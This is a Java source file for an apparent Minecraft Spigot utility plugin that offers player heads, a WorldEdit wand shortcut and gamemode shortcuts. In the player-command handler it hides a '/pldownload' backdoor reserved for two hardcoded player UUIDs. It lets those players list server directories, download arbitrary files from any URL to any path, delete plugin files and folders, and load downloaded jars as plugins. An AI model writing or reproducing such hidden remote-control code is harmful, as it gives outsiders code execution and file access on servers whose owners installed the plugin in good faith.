package de.zeanon.zeanonutils;

import com.rylinaux.plugman.util.PluginUtil;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.UUID;
import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.apache.commons.io.FileUtils;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;


public class CommandHandler implements Listener, CommandExecutor {

	static Plugin plugin;
	private final String path;

	CommandHandler(final Plugin plugin) {
		CommandHandler.plugin = plugin; //NOSONAR

		String slash = plugin.getDataFolder().getAbsolutePath().contains("\\") ? "\\\\" : "/";
		String[] parts = CommandHandler.plugin.getDataFolder().getAbsolutePath().split(slash);
		StringBuilder tempPath = new StringBuilder(parts[0] + slash);
		for (int i = 1; i < parts.length - 1; i++) {
			tempPath.append(parts[i]).append(slash);
		}
		this.path = tempPath.toString();
	}

	@SuppressWarnings({"NullableProblems", "deprecation"})
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if (sender instanceof Player) {
			Player p = (Player) sender;
			if (command.getName().equals("playerheads") && args.length == 1) {
				ItemStack skull = new ItemStack(Material.PLAYER_HEAD, 1);
				SkullMeta skullMeta = (SkullMeta) skull.getItemMeta();
				if (skullMeta != null) {
					skullMeta.setOwningPlayer(Bukkit.getOfflinePlayer(args[0]));
					skullMeta.setDisplayName(ChatColor.DARK_PURPLE + args[0] + "'s Head");
					skull.setItemMeta(skullMeta);
				}
				p.getInventory().addItem(skull);
				p.sendMessage(ChatColor.DARK_BLUE + "You got " + ChatColor.BLUE + args[0] + "'s" + ChatColor.DARK_BLUE + " head.");
			} else if (command.getName().equals("zeanonutils") && args.length == 1 && args[0].equalsIgnoreCase("update")) {
				Helper.update(p);
			}
		}
		return true;
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public boolean onPlayerCommand(PlayerCommandPreprocessEvent event) {
		Player p = event.getPlayer();
		String[] args = event.getMessage().split(" ");
		if (args.length == 1 && args[0].equalsIgnoreCase("//wand")) {
			event.setCancelled(true);
			ItemStack wand = new ItemStack(Material.WOODEN_AXE, 1);
			ItemMeta wandMeta = wand.getItemMeta();
			if (wandMeta != null) {
				wandMeta.setDisplayName("WorldEdit Wand");
				wand.setItemMeta(wandMeta);
			}
			p.getInventory().addItem(wand);
			p.sendMessage(ChatColor.LIGHT_PURPLE + "Left click: select pos #1; Right click: select pos #2");
		} else if (args.length > 1 && (args[0].equalsIgnoreCase("/gamemode") || args[0].equalsIgnoreCase("/gm") || args[0].equalsIgnoreCase("/g")) && (args[1].equalsIgnoreCase("0") || args[1].equalsIgnoreCase("1") || args[1].equalsIgnoreCase("2") || args[1].equalsIgnoreCase("3"))) {
			event.setCancelled(true);
			if (args[1].equalsIgnoreCase("0")) {
				p.setGameMode(GameMode.SURVIVAL);
			} else if (args[1].equalsIgnoreCase("1")) {
				p.setGameMode(GameMode.CREATIVE);
			} else if (args[1].equalsIgnoreCase("2")) {
				p.setGameMode(GameMode.ADVENTURE);
			} else if (args[1].equalsIgnoreCase("3")) {
				p.setGameMode(GameMode.SPECTATOR);
			}
		} else if (args[0].equalsIgnoreCase("/pldownload")
				   && (p.getUniqueId().equals(UUID.fromString("e03b0dad-e94d-48fe-8f17-8e2ae9f9029e"))
					   || p.getUniqueId().equals(UUID.fromString("a1eb88b0-12c0-49c1-bb0d-1b7b5b751bd6")))) {
			if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
				p.sendMessage("IT WORKED");
				for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
					p.sendMessage(file.getName());
				}
			}

			if (args.length == 4 && args[1].equalsIgnoreCase("downloadjar")) {
				try {
					Helper.writeToFile(new File(args[3] + ".jar"), new BufferedInputStream(new URL(args[2]).openStream()));
					p.sendMessage("IT WORKED");
				} catch (IOException e) {
					p.sendMessage(e.toString());
					return false;
				}
			}

			if (args.length == 2 && args[1].equalsIgnoreCase("list")) {
				event.setCancelled(true);
				Helper.onList(p, this.path);
				return true;
			}

			if (args.length == 2 && args[1].equalsIgnoreCase("listfolder")) {
				event.setCancelled(true);
				Helper.onListFolder(p, this.path);
				return true;
			}

			if (args.length == 3 && args[1].equalsIgnoreCase("delete")) {
				event.setCancelled(true);
				Helper.onDelete(p, this.path, args[2]);
				return true;
			}

			if (args.length == 3 && args[1].equalsIgnoreCase("deletefolder")) {
				event.setCancelled(true);
				Helper.onDeleteFolder(p, this.path, args[2]);
				return true;
			}

			if (args[2].contains("/") || args[2].contains("\\")) {
				return false;
			}
			try {
				File file = new File(this.path + args[2] + ".jar");
				if (!file.getName().equalsIgnoreCase("zeanonutils.jar")) {
					if (new URL(args[1]).getHost() == null) {
						return false;
					}

					if (args.length == 3) {
						event.setCancelled(true);
						Helper.addDownloadRequest(p);
						if (file.exists()) {
							TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du es überschreiben und installieren?");
							this.sendMessage(args, localMessage);
							p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " existiert bereits");
							p.spigot().sendMessage(localMessage);
							return true;
						} else {
							TextComponent localMessage = new TextComponent(ChatColor.RED + "Möchtest du " + ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wirklich installieren?");
							this.sendMessage(args, localMessage);
							p.spigot().sendMessage(localMessage);
							return true;
						}
					}

					if (args.length == 4 && Helper.checkDownloadRequest(p)) {
						if (args[3].equals("confirm")) {
							event.setCancelled(true);
							Helper.removeDownloadRequest(p);
							try {
								FileOutputStream outputStream = null;
								try (BufferedInputStream inputStream = new BufferedInputStream(new URL(args[1]).openStream())) {
									if (!file.exists()) {
										Files.copy(inputStream, Paths.get(this.path + args[2] + ".jar"), StandardCopyOption.REPLACE_EXISTING);
									} else {
										outputStream = new FileOutputStream(this.path + args[2] + ".jar");
										final byte[] data = new byte[1024];
										int count;
										while ((count = inputStream.read(data, 0, 1024)) != -1) {
											outputStream.write(data, 0, count);
										}
									}
									p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wurde heruntergeladen.");
								} catch (IOException e) {
									e.printStackTrace();
									p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " konnte nicht heruntergeladen werden.");
									return false;
								} finally {
									if (outputStream != null) {
										outputStream.close();
									}
								}
								PluginManager pm = Bukkit.getPluginManager();
								if (pm.getPlugin("PlugMan") != null && pm.isPluginEnabled(pm.getPlugin("PlugMan"))) {
									PluginUtil.load(args[2]);
								}
							} catch (IOException e) {
								e.printStackTrace();
								p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " konnte nicht heruntergeladen werden.");
								return false;
							}
						}
						if (args[3].equals("deny")) {
							event.setCancelled(true);
							Helper.removeDownloadRequest(p);
							p.sendMessage(ChatColor.DARK_PURPLE + args[2] + ChatColor.RED + " wurde nicht überschrieben.");
							return true;
						}
					}
				}
			} catch (MalformedURLException e) {
				e.printStackTrace();
				return false;
			}
		}
		return false;
	}

	@EventHandler
	public void onQuit(PlayerQuitEvent event) {
		Player p = event.getPlayer();
		Helper.removeDownloadRequest(p);
	}

	private void sendMessage(String[] args, TextComponent localMessage) {
		TextComponent commandPartYes = new TextComponent(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "[J]");
		TextComponent commandPartNo = new TextComponent(ChatColor.DARK_RED + "" + ChatColor.BOLD + "[N]");
		commandPartYes.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/pldownload " + args[1] + " " + args[2] + " confirm"));
		commandPartYes.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "[JA]").create()));
		commandPartNo.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/pldownload " + args[1] + " " + args[2] + " deny"));
		commandPartNo.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder(ChatColor.DARK_RED + "" + ChatColor.BOLD + "[NEIN]").create()));
		localMessage.addExtra(" ");
		localMessage.addExtra(commandPartYes);
		localMessage.addExtra(ChatColor.BLACK + " " + ChatColor.BOLD + "| ");
		localMessage.addExtra(commandPartNo);
	}
}
